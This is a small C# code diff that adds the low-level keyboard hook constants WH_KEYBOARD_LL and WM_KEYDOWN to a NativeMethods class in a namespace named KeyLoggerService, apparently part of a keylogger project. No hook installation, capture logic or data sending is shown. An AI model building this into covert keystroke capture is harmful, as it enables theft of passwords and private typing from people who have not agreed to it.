@@ -3,6 +3,9 @@ namespace KeyLoggerService.HookSetting
 {
     public static class NativeMethods
     {
+        public const int WH_KEYBOARD_LL = 13;
+        public const int WM_KEYDOWN = 0x0100;
+
         public delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
 
 
